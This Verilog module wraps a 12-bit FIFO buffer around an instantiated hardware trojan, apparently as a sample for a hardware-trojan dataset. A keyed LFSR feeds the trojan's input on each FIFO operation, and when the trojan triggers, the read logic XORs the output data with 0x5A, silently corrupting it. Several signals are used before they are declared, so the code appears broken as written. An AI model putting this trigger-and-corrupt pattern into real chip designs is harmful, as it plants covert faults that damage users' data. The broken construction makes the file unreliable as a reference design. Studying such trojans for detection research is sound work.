// FIFO Host Circuit for Trojan1  
// Fixed I/O to match Trojan1: clk, rst, r1 -> trigger
module trojan1_fifo_host #(
    parameter [27:0] R1_KEY = 28'hBEEF123  // Key for r1 generation
)(
    input wire clk,
    input wire rst,
    input wire [DATA_WIDTH-1:0] write_data,
    input wire write_enable,
    input wire read_enable,
    output reg [DATA_WIDTH-1:0] read_data,
    output reg fifo_full,
    output reg fifo_empty,
    output reg fifo_overflow,
    output reg fifo_underflow
);

    // Sizing parameters (converted from parameter to localparam)
    localparam DATA_WIDTH = 12;    // FIFO data width
    localparam ADDR_WIDTH = 4;     // Address width (DEPTH = 2^ADDR_WIDTH)

    // Trojan interface (fixed width)
    reg trojan_r1;
    wire trojan_trigger;
    
    // FIFO structure
    localparam DEPTH = 1 << ADDR_WIDTH;  // Enforce DEPTH = 2^ADDR_WIDTH
    reg [DATA_WIDTH-1:0] fifo_mem [0:DEPTH-1];
    reg [ADDR_WIDTH-1:0] write_ptr;
    reg [ADDR_WIDTH-1:0] read_ptr;
    reg [ADDR_WIDTH:0] fifo_count;
    reg [27:0] r1_generator;
    reg [2:0] r1_select;
    
    // R1 signal generation using rotating key
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            r1_generator <= R1_KEY;
            r1_select <= 3'b0;
        end else if (write_enable || read_enable) begin
            // Use 28-bit maximal-length LFSR: x^28 + x^25 + x^3 + x^2 + 1
            r1_generator <= {r1_generator[26:0], r1_generator[27] ^ r1_generator[24] ^ r1_generator[2] ^ r1_generator[1]};
            r1_select <= r1_select + 1;
        end
    end
    
    // Select different bits for r1 based on operation
    always @(*) begin
        case (r1_select)
            3'b000: trojan_r1 = r1_generator[0];
            3'b001: trojan_r1 = r1_generator[4];
            3'b010: trojan_r1 = r1_generator[8];
            3'b011: trojan_r1 = r1_generator[12];
            3'b100: trojan_r1 = r1_generator[16];
            3'b101: trojan_r1 = r1_generator[20];
            3'b110: trojan_r1 = r1_generator[24];
            3'b111: trojan_r1 = r1_generator[27];
            default: trojan_r1 = 1'b0;
        endcase
    end
    
    // FIFO status flags
    always @(*) begin
        fifo_full = (fifo_count == DEPTH[ADDR_WIDTH:0]);
        fifo_empty = (fifo_count == {ADDR_WIDTH+1{1'b0}});
    end
    
    // FIFO counter
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            fifo_count <= {ADDR_WIDTH+1{1'b0}};
        end else begin
            // Allow simultaneous read/write even when full (if reading frees space)
            reg local_read_do;
            local_read_do = read_enable && !fifo_empty;
            
            if (write_do && local_read_do) begin
                fifo_count <= fifo_count;  // Simultaneous read/write
            end else if (write_do) begin
                fifo_count <= fifo_count + 1;  // Write only
            end else if (local_read_do) begin
                fifo_count <= fifo_count - 1;  // Read only
            end
        end
    end
    
    // Write condition calculation
    reg write_do;
    always @(*) begin
        write_do = write_enable && !(fifo_full && !read_enable);
    end
    
    // Write pointer management
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            write_ptr <= {ADDR_WIDTH{1'b0}};
        end else if (write_do) begin
            write_ptr <= write_ptr + 1;
        end
    end
    
    // Read pointer management
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            read_ptr <= {ADDR_WIDTH{1'b0}};
        end else if (read_enable && !fifo_empty) begin
            read_ptr <= read_ptr + 1;
        end
    end
    
    // FIFO write operation
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            // Memory reset not needed for synthesis
        end else if (write_do) begin
            fifo_mem[write_ptr] <= write_data;
        end
    end
    
    // FIFO read operation with trojan trigger integration
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            read_data <= {DATA_WIDTH{1'b0}};
        end else if (read_enable && !fifo_empty) begin
            // Mix read data with trojan trigger (safe width handling)
            if (DATA_WIDTH >= 8) begin
                read_data <= fifo_mem[read_ptr] ^ (trojan_trigger ? {{(DATA_WIDTH-8){1'b0}}, 8'h5A} : {DATA_WIDTH{1'b0}});
            end else begin
                read_data <= fifo_mem[read_ptr] ^ (trojan_trigger ? {DATA_WIDTH{1'b1}} : {DATA_WIDTH{1'b0}});
            end
        end
    end
    
    // Error flag management
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            fifo_overflow <= 1'b0;
            fifo_underflow <= 1'b0;
        end else begin
            // Sticky error flags - latch until reset
            if (write_enable && fifo_full && !read_enable) begin
                fifo_overflow <= 1'b1;
            end
            if (read_enable && fifo_empty) begin
                fifo_underflow <= 1'b1;
            end
        end
    end
    
    // Memory does not need explicit reset for synthesis
    
    // Instantiate Trojan1
    Trojan1 trojan_inst (
        .clk(clk),
        .rst(rst),
        .r1(trojan_r1),
        .trigger(trojan_trigger)
    );

endmodule

